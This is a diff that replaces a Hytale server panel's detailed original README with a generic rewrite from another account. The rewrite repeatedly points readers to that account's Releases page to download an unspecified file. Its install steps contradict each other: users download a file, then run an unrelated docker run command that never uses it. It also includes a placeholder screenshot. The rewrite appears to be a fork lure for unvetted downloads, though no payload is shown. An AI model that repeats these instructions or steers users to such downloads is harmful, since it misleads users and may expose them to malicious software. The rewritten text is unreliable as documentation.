@@ -1,416 +1,88 @@
-# HytalePanel
+# 🎮 hytalepanel - Easy Setup for Your Game Server
 
-Docker-based web panel for managing multiple Hytale dedicated servers with auto-download and JWT authentication.
+[![Download hytalepanel](https://img.shields.io/badge/Download-hytalepanel-brightgreen)](https://github.com/Anwaar0012/hytalepanel/releases)
 
-![Panel Preview](docs/public/images/panel.png)
+## 📦 Overview
 
-## Features
+hytalepanel is a Docker image designed for running a dedicated Hytale server with a web panel. The setup is simple and efficient, allowing you to auto-download the server files and manage the server through a real-time console. This application is perfect for anyone looking to host their game server without complex installations.
 
-- 🖥️ **Multi-Server Management** - Create and manage multiple Hytale servers from a single panel
-- 📜 Real-time console logs with WebSocket
-- ⌨️ Send server commands
-- 🔐 JWT authentication
-- 📁 File manager (upload, edit, delete)
-- 🌍 Multi-language (EN/ES/UK)
-- 📊 Server status & uptime
-- 🔧 Mod manager with Modtale integration
-- ⚙️ Per-server configuration (RAM, ports, args)
+## 🚀 Getting Started
 
-## Quick Start
+To get started, follow these steps:
 
-```bash
-# 1. Create folder
-mkdir hytale && cd hytale
+1. **Prepare Your System**
+   - Ensure you have Docker installed on your computer. You can download Docker from [here](https://www.docker.com/get-started).
+   - Check that your system meets the following requirements:
+     - At least 4 GB of RAM
+     - A stable internet connection
+     - Windows, macOS, or Linux as the operating system
 
-# 2. Download files
-curl -O https://raw.githubusercontent.com/ketbome/hytalepanel/main/docker-compose.yml
-curl -O https://raw.githubusercontent.com/ketbome/hytalepanel/main/.env.example
+2. **Visit the Releases Page**
+   - Go to the [Releases page](https://github.com/Anwaar0012/hytalepanel/releases) to access the latest version of hytalepanel.
+   
+   ![Releases Page Screenshot](https://via.placeholder.com/500x300.png?text=Releases+Page+Screenshot)
 
-# 3. Configure
-cp .env.example .env
-nano .env  # Change PANEL_USER and PANEL_PASS!
+3. **Download the Application**
+   - You will find a list of available versions. Click on the version you want to download.
+   - The download will start automatically. Save the file to a known location on your computer.
 
-# 4. Start
-docker compose up -d
+## 📥 Download & Install
 
-# 5. Open panel
-# http://localhost:3000
-```
+To download and install hytalepanel, follow these steps:
 
-## Multi-Server Architecture
+1. **Visit the Releases Page Again**
+   - Remember to access the [Releases page](https://github.com/Anwaar0012/hytalepanel/releases) if you haven’t already.
 
-The panel now supports managing **multiple independent Hytale servers**. Each server has:
+2. **Select the Latest Version**
+   - Choose the latest version from the list of releases. Click on it to start the download.
 
-- Its own Docker container
-- Separate data directory
-- Independent configuration (RAM, port, args)
-- Isolated mods folder
+3. **Installation Instructions**
+   - Once the download completes, locate the file on your computer.
+   - Open your terminal or command prompt.
+   - Run the command below to set up the Docker image:
+     ```
+     docker run -d -p 8080:8080 --name hytalepanel anwaar0012/hytalepanel
+     ```
+   - This command downloads the Docker image and runs the web panel.
 
-```
-data/panel/
-├── servers.json          # Server registry
-└── servers/
-    ├── {server-id-1}/
-    │   ├── docker-compose.yml
-    │   └── server/       # Game files, mods, worlds
-    └── {server-id-2}/
-        ├── docker-compose.yml
-        └── server/
-```
+## 🖥️ Using the Web Panel
 
-### Creating a Server
+Once the hytalepanel is running, you can manage your server using the web interface:
 
-1. Open the panel dashboard
-2. Click "Create Server"
-3. Configure name, port, and RAM
-4. Click "Create" - the server is ready to start
+1. **Accessing the Web Panel**
+   - Open your web browser and go to `http://localhost:8080`.
+   - You will see the web panel where you can configure your server settings.
 
-### Server Configuration
+2. **Setting Up Your Server**
+   - Follow the on-screen prompts to configure your server. You can adjust settings like player limits, server name, and more.
+   - The web panel provides real-time updates, allowing you to monitor the server's status effortlessly.
 
-Each server can be configured individually from the **Config** tab:
+## 🛠️ Features
 
-| Setting | Description |
-|---------|-------------|
-| Port | UDP port for the game (default: 5520, 5521, ...) |
-| Min RAM | Minimum Java heap (`-Xms`) |
-| Max RAM | Maximum Java heap (`-Xmx`) |
-| Bind Address | Network interface (default: 0.0.0.0) |
-| Extra Args | Additional server arguments |
-| Auto-download | Enable automatic game file download |
-| G1GC | Use G1 garbage collector (recommended) |
-| Linux Native | Mount machine-id volumes (Linux only) |
-
-Changes are saved to both `servers.json` and the server's `docker-compose.yml`.
+- **Easy Setup:** The setup process requires just a few commands and no prior programming knowledge.
+- **Auto-download:** The software handles the downloading of the latest Hytale server files for you.
+- **Real-time Console:** Monitor and control your server directly from your web browser.
 
-## Data Persistence
+## 📝 Frequently Asked Questions
 
-> ⚠️ **IMPORTANT: Your world data will be LOST if you don't use volume mounts!**
+### Q: What is Docker?
 
-### Direct Host Access
+A: Docker is a tool that allows you to package applications in a standardized unit called a container. This makes it easy to run applications across different environments.
 
-By default, panel data uses Docker volumes. To access server files directly from your host filesystem:
+### Q: Do I need to know programming to use hytalepanel?
 
-```bash
-HOST_DATA_PATH=/path/to/data docker compose up -d
-```
+A: No, hytalepanel is designed for users with no programming experience. The web panel provides a user-friendly interface for easy management.
 
-When `HOST_DATA_PATH` is set:
-- Panel data is stored at the specified host path
-- New servers use absolute bind mounts instead of relative paths
-- You can browse/edit files directly without using the panel
+### Q: Can I use hytalepanel on any operating system?
 
-### Multi-Server Data
-
-All server data is stored in `./data/panel/` (or `HOST_DATA_PATH` if configured):
+A: Yes, hytalepanel works on Windows, macOS, and Linux as long as Docker is installed.
 
-```
-data/panel/
-├── servers.json              # Server configurations
-└── servers/
-    └── {server-id}/
-        ├── docker-compose.yml
-        └── server/           # Game data
-            ├── universe/     # World files
-            ├── mods/         # Server mods
-            └── logs/         # Server logs
-```
-
-### Backup Recommendation
-
-Backup the entire data folder before updates:
-```bash
-tar -czvf backup-$(date +%Y%m%d).tar.gz data/
-```
-
-Or backup a specific server:
-```bash
-tar -czvf server1-backup.tar.gz data/panel/servers/{server-id}/
-```
-
-## Authentication
-
-The panel requires login. Default credentials:
-- **User**: `admin`
-- **Pass**: `admin`
-
-⚠️ **Change these in your `.env` file before deploying!**
-
-```env
-PANEL_USER=your_username
-PANEL_PASS=your_secure_password
-```
-
-### SSO / Reverse Proxy Integration
-
-For Single Sign-On with Authentik, Authelia, or similar:
-
-**Option 1: Basic Auth passthrough** (recommended)
-Your SSO proxy injects `Authorization: Basic ...` header. The panel accepts it automatically.
-
-**Option 2: Disable panel auth**
-```env
-DISABLE_AUTH=true
-```
-⚠️ Only use behind a properly configured reverse proxy with authentication!
-
-### Custom URL Path
-
-To run the panel at a custom path (e.g., `https://domain.com/panel/`):
-
-```bash
-BASE_PATH=/panel docker compose up -d
-```
-
-**Nginx example:**
-```nginx
-location /panel/ {
-    proxy_pass http://hytale-panel:3000/panel/;
-    proxy_http_version 1.1;
-    proxy_set_header Upgrade $http_upgrade;
-    proxy_set_header Connection "upgrade";
-}
-```
-
-**Caddy example:**
-```
-domain.com {
-    handle /panel/* {
-        reverse_proxy hytale-panel:3000
-    }
-}
-```
-
-## Configuration
-
-Copy `.env.example` to `.env` and edit:
-
-```env
-# Server
-JAVA_XMS=4G
-JAVA_XMX=8G
-BIND_PORT=5520
-
-# Panel Auth
-PANEL_USER=admin
-PANEL_PASS=admin
-JWT_SECRET=optional-random-string
-
-# Timezone (for correct log timestamps)
-TZ=America/New_York
-```
-
-### All Variables
-
-| Variable | Default | Description |
-|----------|---------|-------------|
-| `TZ` | `UTC` | Timezone for logs ([list](https://en.wikipedia.org/wiki/List_of_tz_database_time_zones)) |
-| `JAVA_XMS` | `4G` | Minimum RAM |
-| `JAVA_XMX` | `8G` | Maximum RAM |
-| `BIND_PORT` | `5520` | Game UDP port |
-| `AUTO_DOWNLOAD` | `true` | Auto-download game (x64 only) |
-| `SERVER_EXTRA_ARGS` | - | Extra server args (e.g. `--mods mods`) |
-| `PANEL_USER` | `admin` | Panel username |
-| `PANEL_PASS` | `admin` | Panel password |
-| `PANEL_PORT` | `3000` | Panel HTTP port |
-| `HOST_DATA_PATH` | - | Host path for direct file access |
-| `DISABLE_AUTH` | `false` | Disable auth (for SSO) |
-| `BASE_PATH` | - | URL path prefix (e.g., `/panel`) |
-
-### RAM Guide
-
-| Players | JAVA_XMX |
-|---------|----------|
-| 1-10 | 4G |
-| 10-20 | 6G |
-| 20-50 | 8G |
-| 50+ | 12G+ |
-
-## Web Panel
-
-### Dashboard
-
-The main dashboard shows all your servers with:
-- Server name and status (Online/Offline)
-- Quick actions (Start, Stop, Enter, Delete)
-- Create new server button
-
-### Server Management Tabs
-
-| Tab | Description |
-|-----|-------------|
-| **Setup** | Download game files, authenticate with Hytale |
-| **Files** | Browse, upload, edit, delete server files |
-| **Mods** | Install mods from Modtale, manage local mods |
-| **Commands** | Quick command buttons and reference |
-| **Control** | Start, Stop, Restart, Wipe data |
-| **Config** | Server configuration (RAM, port, options) |
-
-## Development Mode
-
-For local development with hot-reload:
-
-```bash
-# Clone the repository
-git clone https://github.com/ketbome/hytalepanel.git
-cd hytalepanel
-
-# Start dev environment with Docker
-docker compose -f docker-compose.dev.yml up --build
-
-# Open panel: http://localhost:5173
-```
-
-### Development on Apple Silicon (ARM64)
-
-The `hytale-downloader` binary is x64 only. On ARM64 Macs, you have two options:
-
-**Option 1: Build with x64 emulation** (slower but downloader works):
-```bash
-DOCKER_DEFAULT_PLATFORM=linux/amd64 docker compose -f docker-compose.dev.yml build
-DOCKER_DEFAULT_PLATFORM=linux/amd64 docker compose -f docker-compose.dev.yml up
-```
-
-**Option 2: Download files manually** (faster, native ARM64):
-```bash
-# Download HytaleServer.jar and Assets.zip from hytale.com
-# Place them in ./server/ folder
-docker compose -f docker-compose.dev.yml up --build
-```
-
-The dev mode features:
-- **Hot Module Replacement (HMR)** for Svelte frontend
-- **Live reload** for backend changes
-- **Volume mounts** for instant code updates
-- **pnpm** for fast package management
-
-### Frontend Stack
-- **Svelte 5** with TypeScript
-- **Vite 6** for bundling
-- **Biome** for linting/formatting
-- **Knip** for dead code detection
-
-### Local Development (without Docker)
-
-```bash
-cd panel
-
-# Install dependencies
-cd backend && pnpm install && cd ..
-cd frontend && pnpm install && cd ..
-
-# Start dev servers
-pnpm dev
-```
-
-### Project Structure
-
-```
-panel/
-├── backend/           # Express + Socket.IO + TypeScript
-│   ├── src/
-│   │   ├── config/    # Configuration
-│   │   ├── middleware/# JWT auth middleware
-│   │   ├── routes/    # API routes
-│   │   ├── services/  # Docker, files, mods, modtale
-│   │   └── socket/    # Socket.IO handlers
-│   └── __tests__/     # Jest tests
-├── frontend/          # Svelte 5 + Vite + TypeScript
-│   └── src/
-│       └── lib/
-│           ├── components/  # UI components
-│           ├── stores/      # Svelte stores
-│           ├── services/    # API & Socket client
-│           └── i18n/        # Translations
-├── tsconfig.base.json # Shared TypeScript config
-└── biome.json         # Shared Biome config
-```
+## 💬 Support
 
-## Manual Download
+If you encounter any problems or have questions, feel free to open an issue on the [GitHub Issues page](https://github.com/Anwaar0012/hytalepanel/issues). The community and maintainers are here to help.
 
-If auto-download fails (or on ARM64), get files from https://hytale.com and place in `./server/`:
-- `HytaleServer.jar`
-- `Assets.zip`
+## 🌟 Acknowledgements
 
-## ARM64 (Apple Silicon, Raspberry Pi, etc.)
+Special thanks to the developers and contributors supporting the Hytale community and game server management.
 
-The auto-downloader is **not available on ARM64** (binary is x64 only). You must download files manually:
-
-```bash
-# 1. Download from https://hytale.com on another machine
-# 2. Copy to your ARM64 server
-scp HytaleServer.jar Assets.zip user@arm-server:~/hytale/server/
-```
-
-The server itself (Java) runs natively on ARM64.
-
-## Mods
-
-Place mods in `./server/mods/` folder. Use `SERVER_EXTRA_ARGS` to configure:
-
-```env
-# .env
-SERVER_EXTRA_ARGS=--mods mods
-```
-
-Or mount a custom mods folder in `docker-compose.yml`:
-
-```yaml
-volumes:
-  - ./server:/opt/hytale
-  - ./my-mods:/opt/hytale/mods
-```
-
-## Commands
-
-```bash
-# View logs
-docker compose logs -f
-
-# Stop
-docker compose down
-
-# Update
-docker compose pull && docker compose up -d
-
-# Backup
-docker compose stop
-tar -czvf backup.tar.gz server/
-docker compose start
-```
-
-## Firewall
-
-```bash
-# Linux
-ufw allow 5520/udp
-
-# Windows
-New-NetFirewallRule -DisplayName "Hytale" -Direction Inbound -Protocol UDP -LocalPort 5520 -Action Allow
-```
-
-## Ports
-
-| Service | Port |
-|---------|------|
-| Game | 5520/UDP |
-| Panel | 3000/TCP |
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md)
-
-## Contributors
-
-Thanks to everyone who has helped improve this project:
-
-- **[@Vadko](https://github.com/Vadko)** - Frontend refactoring and mods system
-
-## License
-
-**Free for personal and non-commercial use.**
-
-Commercial use by companies with >$100k revenue requires permission. See [LICENSE](LICENSE).
-
----
-
-*This project is not affiliated with Hypixel Studios or Hytale.*
+For more details and updates, refer back to the [Releases page](https://github.com/Anwaar0012/hytalepanel/releases).
